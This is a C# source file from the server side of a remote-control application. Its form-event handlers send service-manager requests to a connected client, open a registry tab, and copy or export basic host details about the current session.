using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Net.Sockets;
using RemoteControl.Protocals;
using System.IO;
using System.Threading;
using System.Diagnostics;
using System.Runtime.InteropServices;
using log4net;
using RemoteControl.Protocals.Plugin;
using RemoteControl.Protocals.Request;
using RemoteControl.Protocals.Response;
using RemoteControl.Audio;
using RemoteControl.Audio.Codecs;
using RemoteControl.Protocals.Utilities;
using RemoteControl.Protocals.Relay;
using RemoteControl.Server.Utils;
namespace RemoteControl.Server
{
    public partial class FrmMain
    {
        private void SendServiceAction(eServiceAction action)
        {
            if (currentSession == null) return;

            FrmInputUrl frm = new FrmInputUrl();
            frm.Text = "请输入服务名称";
            frm.ShowDialog();
            if (string.IsNullOrEmpty(frm.InputText))
                return;

            if (action == eServiceAction.Delete &&
                MsgBox.Question("确定要删除服务 " + frm.InputText + "?", MessageBoxButtons.OKCancel) == DialogResult.Cancel)
            {
                return;
            }

            RequestServiceManager req = new RequestServiceManager();
            req.Action = action;
            req.ServiceName = frm.InputText.Trim();
            currentSession.Send(ePacketType.PACKET_SERVICE_MANAGER_REQUEST, req);
        }

        private void onMenuRegistry(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            this.tabControl1.SelectedIndex = 3;
        }

        private void onMenuCopyHostShareInfo(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            Clipboard.SetText(BuildHostShareInfo(currentSession));
            doOutput("已复制主机分享信息");
        }

        private void onMenuExportHostShareInfo(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            SaveFileDialog sfd = new SaveFileDialog();
            sfd.Filter = "文本文件|*.txt";
            sfd.FileName = "主机分享信息_" + SafeFileName(currentSession.HostName ?? currentSession.SocketId) + ".txt";
            if (sfd.ShowDialog() == DialogResult.OK)
            {
                File.WriteAllText(sfd.FileName, BuildHostShareInfo(currentSession), Encoding.UTF8);
                doOutput("已导出主机分享信息: " + sfd.FileName);
            }
        }

        private string BuildHostShareInfo(SocketSession session)
        {
            StringBuilder sb = new StringBuilder();
            sb.AppendLine("RelayServer=(hidden)");
            sb.AppendLine("ClientId=" + session.SocketId);
            sb.AppendLine("HostName=" + (session.HostName ?? ""));
            sb.AppendLine("IP=" + session.GetSocketIPById());
            sb.AppendLine("AppPath=" + (session.AppPath ?? ""));
            sb.AppendLine("OnlineAvatar=" + (session.OnlineAvatar ?? ""));
            sb.AppendLine("ShareTime=" + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
            return sb.ToString();
        }

        private static string SafeFileName(string value)
        {
            if (string.IsNullOrEmpty(value))
                return "client";
            foreach (char c in Path.GetInvalidFileNameChars())
            {
                value = value.Replace(c, '_');
            }
            return value;
        }

        // ---- 增强功能 事件处理 ----
    }
}
